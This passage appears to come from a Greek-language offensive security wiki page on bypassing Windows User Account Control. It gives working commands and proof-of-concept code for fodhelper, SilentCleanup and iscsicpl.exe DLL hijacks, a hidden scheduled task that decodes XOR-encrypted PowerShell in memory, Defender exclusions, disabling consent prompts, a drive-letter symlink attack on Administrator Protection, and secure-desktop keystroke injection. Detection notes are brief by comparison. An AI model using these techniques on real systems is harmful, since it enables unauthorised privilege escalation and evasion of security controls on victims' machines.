Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Μόλις αποκτήσει elevated privileges, το malware συνήθως **απενεργοποιεί μελλοντικά prompts** ορίζοντας το `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` σε `0` και, στη συνέχεια, εφαρμόζει πρόσθετες τεχνικές defense evasion (π.χ., `Add-MpPreference -ExclusionPath C:\ProgramData`) και αναδημιουργεί την persistence ώστε να εκτελείται με high integrity. Μια τυπική persistence task αποθηκεύει στον δίσκο ένα **XOR-encrypted PowerShell script** και το αποκωδικοποιεί/εκτελεί στη μνήμη κάθε ώρα:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Αυτή η παραλλαγή εξακολουθεί να καθαρίζει το dropper και να αφήνει μόνο τα staged payloads, οπότε η ανίχνευση βασίζεται στην παρακολούθηση του **`CurVer` hijack**, στην παραποίηση του `ConsentPromptBehaviorAdmin`, στη δημιουργία εξαιρέσεων του Defender ή σε scheduled tasks που αποκρυπτογραφούν PowerShell στη μνήμη.<sup>[[5]](#references)</sup>

### Παράκαμψη UAC μέσω της εργασίας `SilentCleanup` (`HKCU\Environment\windir`)

Η εργασία `SilentCleanup` εκκινεί το `cleanmgr.exe` με τα υψηλότερα προνόμια και επεκτείνει το `%windir%` από το περιβάλλον του χρήστη. Αν ελέγχεις το `HKCU\Environment\windir`, μπορείς να ανακατευθύνεις αυτή την επέκταση σε μια αυθαίρετη εντολή και να αποκτήσεις υψηλό επίπεδο ακεραιότητας χωρίς παράθυρο διαλόγου συναίνεσης.<sup>[[8]](#references)</sup> Αυτή η μέθοδος αξίζει ακόμη να δοκιμαστεί σε πρόσφατες εκδόσεις, επειδή το UACME διατηρεί ενεργή την τεχνική και η πρόσφατη παρακολούθηση ζητημάτων δείχνει ότι τα Windows 11 24H2 μπορεί να απαιτούν μόνο μικρές προσαρμογές στα εισαγωγικά.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Αν η εργασία παραθέτει τη διαδρομή σε αυτό το build, δοκιμάστε ξανά με payload που τελειώνει σε εισαγωγικό (για παράδειγμα `cmd.exe"`). Να καθαρίζετε πάντα το `HKCU\Environment\windir` μετά τη δοκιμή.

#### Περισσότερα UAC bypass

Πολλά κλασικά UAC bypass που εκμεταλλεύονται ροές UI, αντικείμενα COM ή αλληλεπίδραση με την επιφάνεια εργασίας απαιτούν **πλήρη διαδραστική συνεδρία** με το θύμα· ένα συνηθισμένο shell `nc.exe` ή μια υπηρεσία που εκτελείται στο **Session 0** συχνά δεν αρκεί.

Συχνά μπορείτε να το επιλύσετε χρησιμοποιώντας μια συνεδρία **meterpreter**. Κάντε migrate σε μια **process** που έχει τιμή **Session** ίση με **1**:

![Ορίστε το ms-settings να δείχνει σε μια προσαρμοσμένη επέκταση (.thm) και αντιστοιχίστε αυτή την επέκταση στο payload μας - Περισσότερα UAC bypass: Μπορείτε να το πετύχετε χρησιμοποιώντας μια συνεδρία meterpreter. Κάντε migrate σε μια process που έχει τιμή Session...](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### UAC Bypass με GUI

Αν έχετε πρόσβαση σε **GUI, μπορείτε απλώς να αποδεχτείτε την προτροπή UAC** όταν εμφανιστεί· δεν χρειάζεστε πραγματικά τεχνικό bypass. Επομένως, η απόκτηση μιας συνεδρίας GUI συχνά αρκεί για να παρακάμψετε την πρακτική δυσκολία που προσθέτει το UAC.

Επιπλέον, αν αποκτήσετε μια συνεδρία GUI που χρησιμοποιούσε κάποιος (ενδεχομένως μέσω RDP), **ορισμένα εργαλεία θα εκτελούνται ως administrator** και από εκεί θα μπορούσατε να **εκτελέσετε**, για παράδειγμα, ένα **cmd** απευθείας **ως admin**, χωρίς να σας ζητηθεί ξανά επιβεβαίωση από το UAC, όπως με το [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **stealthy**.

### Θορυβώδες brute-force UAC bypass

Αν ο θόρυβος είναι αποδεκτός, ένα εργαλείο όπως το [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) μπορεί να ζητά επανειλημμένα elevation μέχρι να το αποδεχτεί ο χρήστης.

### Το δικό σας bypass - Βασική μεθοδολογία UAC bypass

Αν ρίξετε μια ματιά στο **UACME**, θα παρατηρήσετε ότι **πολλά UAC bypass εκμεταλλεύονται DLL hijacking** (συχνά κάνοντας ένα elevated binary να φορτώσει ένα DLL που ελέγχεται από τον attacker, από μια διαδρομή με δικαιώματα εγγραφής). [Διαβάστε αυτό για να μάθετε πώς να εντοπίζετε μια ευπάθεια DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρείτε ένα binary που **autoelevate** (ελέγξτε ότι κατά την εκτέλεσή του λειτουργεί σε επίπεδο υψηλής ακεραιότητας).
2. Με το procmon εντοπίστε συμβάντα "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανότατα θα χρειαστεί να **γράψετε** το DLL μέσα σε κάποιες **προστατευμένες διαδρομές** (όπως η C:\Windows\System32), όπου δεν έχετε δικαιώματα εγγραφής. Μπορείτε να το παρακάμψετε χρησιμοποιώντας:
   1. **wusa.exe**: Windows 7, 8 και 8.1. Επιτρέπει την εξαγωγή του περιεχομένου ενός αρχείου CAB σε προστατευμένες διαδρομές (επειδή αυτό το εργαλείο εκτελείται με υψηλό επίπεδο ακεραιότητας).
   2. **IFileOperation**: Windows 10.
4. Ετοιμάστε ένα **script** για να αντιγράψετε το DLL στην προστατευμένη διαδρομή και να εκτελέσετε το ευάλωτο binary που κάνει autoelevate.

### Άλλη τεχνική UAC bypass

Συνίσταται στην παρακολούθηση του αν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **όνομα/τη διαδρομή** ενός **binary** ή **command** προς **εκτέλεση** (αυτό είναι πιο ενδιαφέρον αν το binary αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).

### UAC bypass μέσω `SysWOW64\iscsicpl.exe` + DLL hijack με user `PATH`

Το 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` είναι ένα **auto-elevated** binary που μπορεί να γίνει αντικείμενο εκμετάλλευσης ώστε να φορτώσει το `iscsiexe.dll` βάσει της σειράς αναζήτησης. Αν μπορείτε να τοποθετήσετε ένα κακόβουλο `iscsiexe.dll` μέσα σε έναν φάκελο όπου ο **user έχει δικαιώματα εγγραφής** και έπειτα να τροποποιήσετε το `PATH` του τρέχοντος χρήστη (για παράδειγμα μέσω του `HKCU\Environment\Path`) ώστε να αναζητείται αυτός ο φάκελος, τα Windows ενδέχεται να φορτώσουν το DLL του attacker μέσα στη διεργασία elevated `iscsicpl.exe` **χωρίς να εμφανιστεί προτροπή UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Πρακτικές σημειώσεις:
- Αυτό είναι χρήσιμο όταν ο τρέχων χρήστης ανήκει στους **Administrators**, αλλά εκτελείται με **Medium Integrity** λόγω του UAC.
- Το αντίγραφο του **SysWOW64** είναι το σχετικό με αυτό το bypass. Αντιμετωπίστε το αντίγραφο του **System32** ως ξεχωριστό binary και επαληθεύστε τη συμπεριφορά του ανεξάρτητα.
- Η τεχνική συνδυάζει **auto-elevation** και **DLL search-order hijacking**, επομένως η ίδια ροή εργασίας ProcMon που χρησιμοποιείται για άλλα UAC bypass είναι χρήσιμη για την επαλήθευση της αποτυχημένης φόρτωσης DLL.

Ελάχιστη ροή:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Ιδέες για ανίχνευση:
- Δημιουργήστε ειδοποίηση για `reg add` / εγγραφές στο registry στο `HKCU\Environment\Path` που ακολουθούνται αμέσως από εκτέλεση του `C:\Windows\SysWOW64\iscsicpl.exe`.
- Αναζητήστε το `iscsiexe.dll` σε **τοποθεσίες που ελέγχονται από τον χρήστη**, όπως `%TEMP%` ή `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Συσχετίστε τις εκκινήσεις του `iscsicpl.exe` με μη αναμενόμενες child processes ή φορτώσεις DLL από τοποθεσίες εκτός των κανονικών καταλόγων των Windows.

### Νεότερη έρευνα που αξίζει να εξεταστεί ξεχωριστά

Ορισμένες αλυσίδες μετά το 2024 δεν μοιάζουν πλέον με τις κλασικές παραβιάσεις registry μέσω `HKCU\Software\Classes`. Για παράδειγμα, η δηλητηρίαση της cache του activation context μπορεί να συνδυάσει ένα **drive remap** και **DLL redirection**, ώστε να μεταβεί από μεσαία σε υψηλή ακεραιότητα μέσω αξιόπιστων UI / auto-elevated binaries, όπως το `ctfmon.exe`, και μεταγενέστερων στόχων, όπως το `fodhelper.exe`. Αντί να επαναλάβετε εδώ το εκτενές PoC, δείτε τα συνοπτικά παραδείγματα payload στο:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Υποκλοπή γράμματος μονάδας μέσω του DOS device map ανά περίοδο σύνδεσης, με το Administrator Protection (preview)

> [!NOTE]
> Από τον Αύγουστο του 2026, η Microsoft εξακολουθεί να τεκμηριώνει το Administrator Protection ως **Insider preview**: η διάθεση του Οκτωβρίου 2025 ανακλήθηκε και έχει προγραμματιστεί για μεταγενέστερη ημερομηνία. Πριν από τη δοκιμή αυτών των αλυσίδων, επιβεβαιώστε ότι είναι πράγματι ενεργοποιημένη η **Admin Approval Mode with Administrator protection** και ότι η συσκευή έχει επανεκκινηθεί· μια συμβολοσειρά έκδοσης 25H2 από μόνη της δεν αποδεικνύει ότι η δυνατότητα είναι ενεργή.<sup>[[10]](#references)</sup>

Για την πλήρη επιφάνεια επίθεσης `RAiLaunchAdminProcess` / UIAccess σε preview builds των Windows 11 25H2, δείτε την ειδική σελίδα:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Το “Administrator Protection” των Windows 11 25H2 χρησιμοποιεί shadow-admin tokens με χάρτες `\Sessions\0\DosDevices/<LUID>` ανά περίοδο σύνδεσης. Ο κατάλογος δημιουργείται καθυστερημένα από το `SeGetTokenDeviceMap` κατά την πρώτη επίλυση του `\??`. Αν ο επιτιθέμενος υποδυθεί το shadow-admin token μόνο στο επίπεδο **SecurityIdentification**, ο κατάλογος δημιουργείται με ιδιοκτήτη τον επιτιθέμενο (κληρονομεί το `CREATOR OWNER`), επιτρέποντας συνδέσμους γραμμάτων μονάδων που έχουν προτεραιότητα έναντι του `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Βήματα:**

1. Από μια συνεδρία με χαμηλά προνόμια, καλέστε το `RAiProcessRunOnce` για να εκκινήσετε ένα shadow-admin `runonce.exe` χωρίς prompt.
2. Δημιουργήστε ένα αντίγραφο του κύριου token του ως token **identification** και υποδυθείτε το ενώ ανοίγετε το `\??`, ώστε να εξαναγκάσετε τη δημιουργία του `\Sessions\0\DosDevices/<LUID>` με ιδιοκτήτη τον επιτιθέμενο.
3. Δημιουργήστε εκεί ένα symlink `C:` που δείχνει σε αποθηκευτικό χώρο υπό τον έλεγχο του επιτιθέμενου· οι επόμενες προσβάσεις στο σύστημα αρχείων σε εκείνη τη συνεδρία επιλύουν το `C:` στη διαδρομή του επιτιθέμενου, επιτρέποντας DLL/file hijack χωρίς prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Σε hosts προεπισκόπησης, το Administrator Protection καταγράφει τις εγκρίσεις και τις αποτυχίες ως συμβάντα ETW **15031** και **15032** στον provider `Microsoft-Windows-LUA`. Τα συμβάντα περιλαμβάνουν το SID του αιτούντος, τη διαδρομή της εφαρμογής, την έκβαση, τον διαχειριζόμενο λογαριασμό διαχειριστή και τη μέθοδο ελέγχου ταυτότητας, επομένως οι επαναλαμβανόμενες απόπειρες exploit ή οι αποτυχημένες προσπάθειες χειρισμού του UI δεν περνούν απαρατήρητες από την τηλεμετρία.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### Είσοδος στην ασφαλή επιφάνεια εργασίας μέσω εγγράψιμου δακτυλίου κοινόχρηστης μνήμης

Ένα βοηθητικό πρόγραμμα ασφαλούς επιφάνειας εργασίας μπορεί να υπονομεύσει την προτροπή UAC, αν ένας χρήστης μεσαίου επιπέδου ακεραιότητας μπορεί να γράψει στο IPC εισόδου του. Στη σχεδίαση του Steam που αναφέρθηκε, η `IClientSecureDesktop::BStartStreaming` εκκινεί το `secure_desktop_capture.exe` ως SYSTEM στο `winsta0\winlogon`. Εκθέτει το `Global\SecureDesktopInput_mem-IPCWrapper` με πρόσβαση `GENERIC_ALL` για τους χρήστες. Το βοηθητικό πρόγραμμα καταναλώνει εγγραφές του δακτυλίου και καλεί τη `SendInput` στην ασφαλή επιφάνεια εργασίας. Αυτό διαφέρει από το UIAccess ή την αλλαγή του `PromptOnSecureDesktop`: η είσοδος προωθείται από μια διεργασία που εκτελείται ήδη εκεί. Δείτε το [bootstrap του service IPC](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc) για να δείτε πώς ο client φτάνει σε αυτόν τον handler. <sup>[[15]](#references)[[16]](#references)</sup>

Ο δακτύλιος έχει 128 θέσεις των 173 byte. Οι μετρητές εγγραφής και ανάγνωσης βρίσκονται στα `0x414` και `0x418`, ενώ η θέση `N` βρίσκεται στο `0x41c + 173*N`. Ορίστε το πρώτο byte της θέσης σε `0` για απλό κείμενο, αντιγράψτε αμέσως μετά μια δομή Windows `INPUT` 40 byte και, στη συνέχεια, αυξήστε τον μετρητή εγγραφής. Για έναν διαχειριστή μεσαίου επιπέδου ακεραιότητας που αντιμετωπίζει προτροπή συγκατάθεσης, ένα πάτημα του πλήκτρου `Y` (key-down/key-up) μπορεί να ενεργοποιήσει το καταφατικό στοιχείο ελέγχου UAC, αφού εκκινηθεί ένα εκτελέσιμο που ζητά ανύψωση· δεν μπορεί να απαντήσει σε προτροπή διαπιστευτηρίων τυπικού χρήστη. Η **πύλη συγκατάθεσης εξακολουθεί να έχει σημασία**: το βοηθητικό πρόγραμμα προωθεί την είσοδο μόνο αφού ο χρήστης εγκρίνει την προτροπή `InputEnabled` για την τρέχουσα περίοδο εξουσιοδότησης 90 ημερών. Μια αντιστοίχιση με δικαιώματα ανάγνωσης/εγγραφής από μόνη της δεν αποδεικνύει ότι η είσοδος φτάνει στην προτροπή· συγκρίνετε τον μετρητή ανάγνωσης πριν και μετά από μια ελεγχόμενη δοκιμή. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Πώς λειτουργεί ο Έλεγχος λογαριασμού χρήστη](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Συλλογή τεχνικών παράκαμψης UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Σαρωτής συμβατότητας και εκκινητής για παράκαμψη UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – Η KONNI υιοθετεί την AI για τη δημιουργία backdoor PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Επιχείρηση TrueChaos: Εκμετάλλευση 0-Day εναντίον κυβερνητικών στόχων στη Νοτιοανατολική Ασία](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Παράκαμψη της προστασίας διαχειριστή των Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Παράκαμψη UAC με την εργασία SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Παρακάμψεις UnifiedConsent, TabTip και Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Προστασία διαχειριστή](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Κλήση τοπικών Windows RPC servers από .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – Η HoneyMyte ενισχύει το CoolClient με υπογεγραμμένο rootkit πυρήνα των Windows](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: Ένας πλήρως μη ανιχνεύσιμος trojan των Windows, σχεδιασμένος για κατασκοπεία, κλοπή και τρομοκράτηση](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Γυρίζοντας τη βαλβίδα](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – PoC για το Γυρίζοντας τη βαλβίδα](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
